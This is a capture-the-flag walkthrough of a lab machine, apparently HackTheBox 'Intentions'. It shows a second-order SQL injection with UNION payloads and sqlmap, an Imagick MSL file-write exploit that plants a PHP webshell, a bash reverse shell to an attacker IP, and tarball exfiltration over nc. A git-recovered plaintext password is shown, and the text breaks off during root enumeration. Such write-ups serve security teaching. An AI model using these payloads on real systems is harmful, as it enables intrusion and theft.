1,Recon
port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
page check
![](images/Pasted%20image%2020250206181612.png)
We can register an account and login here.
![](images/Pasted%20image%2020250207152840.png)
Then I would continue to check the web-contents
```
ffuf -u http://10.10.11.220/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.220/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 1523, Words: 415, Lines: 40, Duration: 43ms]
admin                   [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 84ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]
gallery                 [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 74ms]
index.php               [Status: 200, Size: 1523, Words: 415, Lines: 40, Duration: 226ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 11ms]
logout                  [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 89ms]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 9ms]
storage                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 12ms]
:: Progress: [4614/4614] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```
When I want to check `/admin`, it would redirect to `http://10.10.11.220/` to let us login.

From the source page of `index.php`, I found the js files from `/js/`
![](images/Pasted%20image%2020250207153825.png)
I’ll eventually come back and think about the interesting obfuscated JavaScript includes. It’s worth looking for any additional files that might be in `/js/`:
```
feroxbuster -u http://10.10.11.220/js -x js

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.220/js
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       36l      123w     6609c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://10.10.11.220/js => http://10.10.11.220/js/
200      GET        2l     5429w   279176c http://10.10.11.220/js/login.js
200      GET        2l     6382w   311246c http://10.10.11.220/js/admin.js
200      GET        2l     7687w   433792c http://10.10.11.220/js/app.js
200      GET        2l     6188w   310841c http://10.10.11.220/js/gallery.js
200      GET        2l     2249w   153684c http://10.10.11.220/js/mdb.js
[####################] - 7m     30000/30000   0s      found:6       errors:0
[####################] - 7m     30000/30000   68/s    http://10.10.11.220/js/ 
```

The most interesting one is admin.js. It too is heavily obfuscated, but there are some JSON objects at the bottom that have clear text strings:
![](images/Pasted%20image%2020250207154057.png)
```
            Recently we've had some copyrighted images slip through onto the gallery. \n                This could turn into a big issue for us so we are putting a new process in place that all new images must go through our legal council for approval.\n                Any new images you would like to add to the gallery should be provided to legal with all relevant copyright information.\n                I've assigned Greg to setup a process for legal to transfer approved images directly to the server to avoid any confusion or mishaps.\n                This will be the only way to add images to our gallery going forward.\n            ")])])]),t._v(" "),e("div",{staticClass:"card"},[e("div",{staticClass:"card-body"},[e("h5",{staticClass:"card-title"},[t._v("v2 API Update")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n            ")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: ")
```
By using the burpsuite to catch the response of login
![](images/Pasted%20image%2020250207154957.png)
Then we can find login via the site are POST requests to `/api/v1/login` with my username and password in plain text.

Looking at the requests in Burp Proxy, visiting “Your Feed” issues a GET request to `/api/v1/gallery/user/feed`. The response is a JSON object with metadata about a list of images (including the full URL to that image):
![](images/Pasted%20image%2020250207160049.png)
If I set the genres to “0xdf”, then no images return. The HTTP response shows success, but with an empty list:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Thu, 14 Sep 2023 19:13:30 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3597
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 30

{"status":"success","data":[]}
```

When I try the `food;`, there is no error here
![](images/Pasted%20image%2020250207160309.png)
But there are no images at “Your Feed”. Looking at the request, it’s a 500 error:
![](images/Pasted%20image%2020250207160440.png)
That’s a good sign that there’s an injection here.

Since this is a second order injection, so we need to change one side and check the other side to get the leak of database.

To get a working injection, I’ll try to “fix” the injection query to get it working again while still having my injection. A simple first guess is setting genres to something like food,' or 1=1-- -. this still returns a 500 error.

So I guess the SQL query running on the server must look something like:
```
SELECT * from images WHERE genre IN ('genre1', 'genre2', 'genre3')
```
If that’s the case, then I would want my input to close both the single quote as well as the parenthesis, with something like food,') or 1=1;-- -. That still errors.

I already noted above that having a space in the query might have been messing something up. Without knowing what it’s doing, I can try using comments instead of spaces, like this:
`food')/**/or/**/1=1#`

It’s important to switch from the -- - comment to #, as the former requires a space to make the comment, and I’m testing without spaces (`--/**/-` will not work).

With my genres set to that, “Your Feed” populates with images of genre animal, architecture, feed, nature, etc. This is successful injection, and it’s a second-order SQL injection because the query to one page that sets the injection is then manifested on another page when viewed.

To do a UNION injection, I’ll need to know the number of columns naturally returned from the query so I can UNION on that same number of columns of data to leak.

I’ll see from the data returned above that each image has at least six things returned `(id, file, genre, created_at, udpated_at, and url)`, through url could be generated from file, so maybe only five items. I’ll try five like this: `')/**/UNION/**/SELECT/**/1,2,3,4,5#`.

In Repeater, I’ll request the feed, and it returns exactly what I’m hoping for:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Thu, 14 Sep 2023 19:27:29 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3594
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 168

{
  "status":"success",
  "data":[
    {
      "id":1,
      "file":"2",
      "genre":"3",
      "created_at":"1970-01-01T00:00:04.000000Z",
      "updated_at":"1970-01-01T00:00:05.000000Z",
      "url":"\/storage\/2"
    }
  ]
}

```

Now I can use that template to make queries into the database. Where I have “2” and “3” are the only things that can take strings, so I’ll focus there. If I replace “2” with “user()” and “3” with “database()”,  `')/**/UNION/**/SELECT/**/1,user(),database(),4,5#`
it shows the results:
```
{
    "status":"success",
    "data":[
        {
            "id":10,
            "file":"laravel@localhost",
         	"genre":"intentions",
         	"created_at":"1970-01-01T00:00:04.000000Z",
         	"updated_at":"1970-01-01T00:00:05.000000Z",
         	"url":"\/storage\/laravel@localhost"
        }
    ]
}
```

I’ll change genres to get the list of databases and tables:
```
')/**/UNION/**/SELECT/**/1,table_schema,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema/**/!=/**/'information_schema'#
```

This will get the database name in the file and the table name in the genre of the output, and it will skip tables in the information_schema table (as those are standard and well defined). It returns:

```
{
    "status":"success",
    "data":[
        {
            "id":1,
            "file":"intentions",
            "genre":"gallery_images",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        },
        {
            "id":1,
            "file":"intentions",
            "genre":"personal_access_tokens",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        },
        {
            "id":1,
            "file":"intentions",
            "genre":"migrations",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        },
        {
            "id":1,
            "file":"intentions",
            "genre":"users",
            "created_at":"1970-01-01T00:00:04.000000Z",
            "updated_at":"1970-01-01T00:00:05.000000Z",
            "url":"\/storage\/intentions"
        }
    ]
}
```
The only database is intentions, and there are four tables: gallery_images, personal_access_tokens, migrations, and users.

The most immediately interesting table is users. I’ll update my genres to list the columns in that table:
```
')/**/UNION/**/SELECT/**/1,2,column_name,4,5/**/from/**/information_schema.columns/**/where/**/table_name='users'#
```
This returns id, name, email, password, created_at, updated_at, and genres. I’ll update my query to get all of the interesting information in one column using concat:
```
')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5/**/from/**/users#
```
I get the following users:
```
steve:steve@intentions.htb:1:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:food,travel,nature
greg:greg@intentions.htb:1:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:food,travel,nature
Melisa Runolfsson:hettie.rutherford@example.org:0:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6:food,travel,nature
Camren Ullrich:nader.alva@example.org:0:$2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2:food,travel,nature
Mr. Lucius Towne I:jones.laury@example.com:0:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae:food,travel,nature
Jasen Mosciski:wanda93@example.org:0:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW:food,travel,nature
Monique D'Amore:mwisoky@example.org:0:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7.:food,travel,nature
Desmond Greenfelder:lura.zieme@example.org:0:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2:food,travel,nature
Mrs. Roxanne Raynor:pouros.marcus@example.net:0:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO:food,travel,nature
Rose Rutherford:mellie.okon@example.com:0:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m:food,travel,nature
Dr. Chelsie Greenholt I:trace94@example.net:0:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W:food,travel,nature
Prof. Johanna Ullrich MD:kayleigh18@example.com:0:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi:food,travel,nature
Prof. Gina Brekke:tdach@example.com:0:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.:food,travel,nature
Jarrett Bayer:lindsey.muller@example.org:0:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS:food,travel,nature
Macy Walter:tschmidt@example.org:0:$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm:food,travel,nature
Prof. Devan Ortiz DDS:murray.marilie@example.com:0:$2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S:food,travel,nature
Eula Shields:barbara.goodwin@example.com:0:$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2:food,travel,nature
Mariano Corwin:maggio.lonny@example.org:0:$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya:food,travel,nature
Madisyn Reinger DDS:chackett@example.org:0:$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW:food,travel,nature
Jayson Strosin:layla.swift@example.net:0:$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei:food,travel,nature
Zelda Jenkins:rshanahan@example.net:0:$2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2:food,travel,nature
Eugene Okuneva I:shyatt@example.com:0:$2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy:food,travel,nature
Mrs. Rhianna Hahn DDS:sierra.russel@example.com:0:$2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma:food,travel,nature
Viola Vandervort DVM:ferry.erling@example.com:0:$2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa:food,travel,nature
Prof. Margret Von Jr.:beryl68@example.org:0:$2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa:food,travel,nature
Florence Crona:ellie.moore@example.net:0:$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy:food,travel,nature
Tod Casper:littel.blair@example.org:0:$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou:food,travel,nature
```
I’ll note the top two, steve and greg, have the “admin” attribute set to 1.

Or we can use sqlmap to automatic do that
The sqlmap syntax has updated over the last five years since Nightmare. --second-order is deprecated in favor of --second-req. I’ll give it --tamper=space2comment (sqlmap will fail without this for the reasons seen above, but it will also suggest trying this tamper). I’ll also give it --technique=U to limit to union injections. It will find the union without this, but it’ll go faster since I know this is possible. I will need to increase the --level 5, which is the max. With all of this, it finds the injection:  
```
sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5
```

I’ll add --dbs to the end and it prints the two db names:
```
sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 --dbs
```

Replacing --dbs with -D intentions --tables will list the tables in intentions:
```
sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 -D intentions --tables
```

Replacing --tables with -T users --dump will dump that table:
```
sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 -D intentions -T users --dump                              
```

I’ll fire up hashcat on my system with these hashes, but after five minutes, none have cracked, and progress is moving very slowly as these are Bcrypt hashes. This doesn’t seem the be the way.

 I noted above the text in admin.js that mentioned the new v2 login API endpoint that did the hashing client-side so that user passwords aren’t submitted in the clear. I could enumerate the entire v2 API, but I’ll start with seeing if there’s a login function in the same place as v1.
 ![](images/Pasted%20image%2020250207164618.png)
 Then we just change the password into hash and use the hashes before.
 ![](images/Pasted%20image%2020250207164736.png)
 In the admin site, there’s a users page that shows the users of the site:
 ![](images/Pasted%20image%2020250207165008.png)
 There’s no interaction here. On the “Images” tab, it lists the images that are available for the gallery:
 ![](images/Pasted%20image%2020250207165043.png)
 Clicking on “Edit” loads the image with four buttons at the top and a bunch of metadata at the bottom:
 ![](images/Pasted%20image%2020250207165135.png)
 Clicking “CHARCOAL”, the image reloads with that effect:
 ![](images/Pasted%20image%2020250207165144.png)
 Clicking the effect button sends a POST to /api/v2/admin/image/modify with a JSON body:
```
{
    "path":"/var/www/html/intentions/storage/app/public/food/rod-long--LMw-y4gxac-unsplash.jpg",
    "effect":"charcoal"
}
```
I noted above the reference to imagick, which is almost certainly ImageMagick.
The path input takes a local path, but if this is using PHP, it’s likely that could take a URL as well. I’ll start a Python webserver on my host, and give it `http://10.10.16.5` as the path. There’s a hit:
`10.10.11.220 - - [07/Feb/2025 17:00:21] "GET / HTTP/1.1" 200 -`

This article has a bunch of details about how to exploit Arbitrary Object Instantiation vulnerabilities in PHP. The article is a bit hard to follow, but it’s looking at cases the author calls $a($b), which is to say some class if passing an attacker controlled variable to it’s constructor. And the example in the article is Imagick!
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

To exploit ImageMagick, the post goes into the Magick Scripting Language (MSL) format. In the post, it shows how passing a URL with an msl: scheme to a new Imagick object results in an arbitrary file write:
![](images/Pasted%20image%2020250207173427.png)
```
This POC will download positive.png from the localhost webserver and write it to a given location.
此POC将从Local -Host Web服务器下载positive.png ，并将其写入给定的位置。

Unfortunately, I can’t chain msl:/ and http:// ( like msl:/http://10.10.14.6/), as that isn’t supported. So I need to get a .msl file on disk.
不幸的是，我无法链接msl:/和http:// （例如msl:/http://10.10.14.6/ ），因为不支持。因此，我需要在磁盘上获取.msl文件。

The author looks at how PHP writes temp files to /tmp/php? where ? is a long random string while the request is being handled. At first, they try to brute force all possible file descriptors, but then discover the vid: scheme. The code for parsing these passes the result to ExpandFilenames, which effectively takes things like * and expands it to get files that match. So with the vid: scheme, I can reference the file as /tmp/php*.dat successfully.
作者研究了PHP如何将临时文件写入/tmp/php?在哪里?在处理请求时是一个长的随机字符串。首先，他们试图强迫所有可能的文件描述符，但然后发现vid: scheme。解析这些通过的代码将结果扩展为ExpandFilenames ，该代码有效地将 *诸如*之类的东西进行了扩展以获取匹配的文件。因此，使用vid:方案，我可以成功地将文件作为/tmp/php*.dat 。
```

Putting this all together, I need to pass into the Imagick constructor something that looks like this: /vid:msl:/tmp/php*. Then, I need to have attached to the request a file to be written to the temp location that is an .msl file, such that when ImageMagick processes the file, it writes a webshell to some location on the disk.

I’ll first try to move the path and effect parameters from the POST body to the GET parameters. It’ll still be a POST request, but if this works, that makes it easier for me to isolate the file upload in the POST body:
![](images/Pasted%20image%2020250207173933.png)
That does work. I’ll want to upload a file that will be temporarily written to /tmp/php* by PHP. To do that, I’ll use a multipart form data by setting the Content-Type header. By giving it filename and Content-Type attributes, PHP will handle it as a file.

The file will be a modified version of what’s in the blog post:
```
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/0xdf.php" />
</image>
```
By writing to /var/www/html/intentions/storage/app/public/, I can expect to find the file in /storage/. I could also try the animals directory, but it doesn’t work (www-data doesn’t have write access).
Now I’ll edit the request headers to add form data for a file upload. My full payload looks like:
```
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
X-XSRF-TOKEN: eyJpdiI6IjVBa2tJN0RvMUNLVlBvRzhaaFhpTWc9PSIsInZhbHVlIjoidW9hUmFITGZsWUQ5NVYyVjcvNlFkc0hQVk9qc0dFTEUrRUFkd1ZEdlFxUHZ2VmlVcitjRlZqMC9saXFCTmt2WkVvQ2Fzb1FmVXMvWkZWcG16SUh4c2hNTWU3aFpaSnEwZURXdWRuTVd4ZDBrWkIrSTVzZlJkLzBJLzJHcyszaGQiLCJtYWMiOiJlM2U1ZTFhNDgzYmQ2ZGExYjkxOWZkZjcwMGJiZTQzMGUyNzY5MmU0NDAzZDVkNjgyNTA1NTE4YWFiMzJjZjE3IiwidGFnIjoiIn0=
Cookie: XSRF-TOKEN=eyJpdiI6IjVBa2tJN0RvMUNLVlBvRzhaaFhpTWc9PSIsInZhbHVlIjoidW9hUmFITGZsWUQ5NVYyVjcvNlFkc0hQVk9qc0dFTEUrRUFkd1ZEdlFxUHZ2VmlVcitjRlZqMC9saXFCTmt2WkVvQ2Fzb1FmVXMvWkZWcG16SUh4c2hNTWU3aFpaSnEwZURXdWRuTVd4ZDBrWkIrSTVzZlJkLzBJLzJHcyszaGQiLCJtYWMiOiJlM2U1ZTFhNDgzYmQ2ZGExYjkxOWZkZjcwMGJiZTQzMGUyNzY5MmU0NDAzZDVkNjgyNTA1NTE4YWFiMzJjZjE3IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6InR0TmJOa0crRGhzSjhEZFQ4bmErRVE9PSIsInZhbHVlIjoidElDYnFRSm1kVjVRSGNmR3FyNzJsdG0yakVsRXFKdVRYR1FMWnRrS1dRSUI1S1BHeENab3E4bGhyTmlTTmszY1llbFRLR1grQ09Lb09mcERjZ29qRGREUUI0cXJLQVUyRzFvUXJSNWNoQXhTVXA3K1pDSy93SVUzRTg5UW9lTEciLCJtYWMiOiJiNDFkOTc2MTJjMDgxZWZjMDU3NzFiZjQzNTEzNzM4YzA4MzU3YWY2ZDU4YWY2N2QwMmNjYWVjYjJiN2YwZjAzIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNjk0Nzg0NjMyLCJleHAiOjE2OTQ4MDYyMzIsIm5iZiI6MTY5NDc4NDYzMiwianRpIjoiUm0yNTFTZkdQUzB5c2dEbyIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.WfIhNsk0pGCcD2BQm1LPmxFJpBAe5yR0ArgRErpFyCQ
Content-Length: 383
Connection: close
Content-Type: multipart/form-data; boundary=------------------------abcd

--------------------------abcd
Content-Disposition: form-data; name="file"; filename="test.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/wither.php" />
</image>
--------------------------abcd
```

On sending, the request hangs for a second, and then returns a 502 Bad Gateway failure:
![](images/Pasted%20image%2020250207174125.png)

This is a sign of success, as wither.php is there:
`curl http://10.10.11.220/storage/wither.php?cmd=id`
Then if we want to get the reverse shell 
`curl http://10.10.11.220/storage/0xdf.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.5/443 0>%261"' `

2, shell as greg
There are three users with home directories in /home:
`greg  legal  steven`
`www-data`’s home directory is `/var/www`, and the only thing in it is the website, in `/var/www/html/intentions`:
```
www-data@intentions:~/html/intentions$ ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2  2023 .
drwxr-xr-x   3 root     root       4096 Feb  2  2023 ..
-rw-r--r--   1 root     root       1068 Feb  2  2023 .env
drwxr-xr-x   8 root     root       4096 Feb  3  2023 .git
-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
-rw-r--r--   1 root     root       1815 Jan 29  2023 composer.json
-rw-r--r--   1 root     root     300400 Jan 29  2023 composer.lock
drwxr-xr-x   2 root     root       4096 Jan 29  2023 config
drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
-rw-r--r--   1 root     root       1629 Jan 29  2023 docker-compose.yml
drwxr-xr-x 534 root     root      20480 Jan 30  2023 node_modules
-rw-r--r--   1 root     root     420902 Jan 30  2023 package-lock.json
-rw-r--r--   1 root     root        891 Jan 30  2023 package.json
-rw-r--r--   1 root     root       1139 Jan 29  2023 phpunit.xml
drwxr-xr-x   5 www-data www-data   4096 Feb  3  2023 public
drwxr-xr-x   7 root     root       4096 Jan 29  2023 resources
drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes
-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage
drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
drwxr-xr-x  45 root     root       4096 Jan 29  2023 vendor
-rw-r--r--   1 root     root        722 Feb  2  2023 webpack.mix.js
```
There is a Git repo (the .git directory) that is readable but not writable by www-data. The permissions on the directory don’t allow www-data to run git commands:
```
www-data@intentions:~/html/intentions$ git log                                                          
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/html/intentions
www-data@intentions:~/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
error: could not lock config file /var/www/.gitconfig: Permission denied
```

So I have to bundle the entire website
```
www-data@intentions:~/html/intentions$ tar -cf /tmp/site.tar .

www-data@intentions:~/html/intentions$ cat /tmp/site.tar | nc 10.10.16.5 4444

```

Then we can use our local machine 
```
git log --oneline 
1f29dfd (HEAD -> master) Fix webpack for production
f7c903a Test cases did not work on steve's local database, switching to user factory per his advice
36b4287 Adding test cases for the API!
d7ef022 Initial v2 commit
```
Exploring the differences in the commits (with `git diff commit1 commit2`), `/tests/Feature/Helper.php` is added in the second commit, “Adding test cases for the API!”:
```
git diff d7ef022 36b4287                            
diff --git a/tests/Feature/APITest.php b/tests/Feature/APITest.php
new file mode 100644
index 0000000..ffa5b53
--- /dev/null
+++ b/tests/Feature/APITest.php
@@ -0,0 +1,91 @@
+<?php
+
+namespace Tests\Feature;
+use Illuminate\Testing\Fluent\AssertableJson;
+use Illuminate\Foundation\Testing\RefreshDatabase;
+use Illuminate\Foundation\Testing\WithFaker;
+use Tests\TestCase;
+
+class APITest extends TestCase
+{
+    public function testImagesUnauthorized()
+    {
+        $response = $this->getJson('/api/v1/gallery/images');
+
+        $response->assertStatus(400);
+    }
+
+    public function testImagesAuthorized()
+    {
+        $response = $this->withCookie('token', Helper::getToken($this))->getJson('/api/v1/gallery/images');
+
+        $response->assertStatus(200)->assertJson(fn (AssertableJson $json) =>
+            $json->has('data')
+                ->has('status')
+        );
+    }
+
+    public function testUserFeedUnauthorized()
+    {
+        $response = $this->getJson('/api/v1/gallery/user/feed');
+
+        $response->assertStatus(400);
+    }
+
+    public function testUserFeedAuthorized()
+    {
+        $response = $this->withCookie('token', Helper::getToken($this))->getJson('/api/v1/gallery/images');
+
+        $response->assertStatus(200)->assertJson(fn (AssertableJson $json) =>
+            $json->has('data')
+                ->has('status')

```

This file is mean to test logging into the API, and it’s using hardcoded credentials for greg. In the third commit, the creds are removed:
```
git diff 36b4287 f7c903a
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
index f57e37b..0586d51 100644
--- a/tests/Feature/Helper.php
+++ b/tests/Feature/Helper.php
@@ -8,12 +8,14 @@ class Helper extends TestCase
 {
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->admin()->create();
         } 
         else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->create();
         }
+        
+        $token = Auth::login($user);
+        $user->delete();
+        return $token;
     }
 }

```
Then we can get the credit `greg:Gr3g1sTh3B3stDev3l0per!1998!` and we can use ssh to connect it.

3, shell as root
I would check the `sudo -l` first 
```
$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
$ sudo -l
[sudo] password for greg: 
Sorry, user greg may not run sudo on intentions.
```
There is some files in the home directory of `greg`
```
$ ls
dmca_check.sh  dmca_hashes.test  user.txt

$ cat dmca_check.sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test

$ ./dmca_check.sh
[+] DMCA-#1952 matches /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg
```

We can also check the `/opt/scanner/scanner`
```
$ /opt/scanner/scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
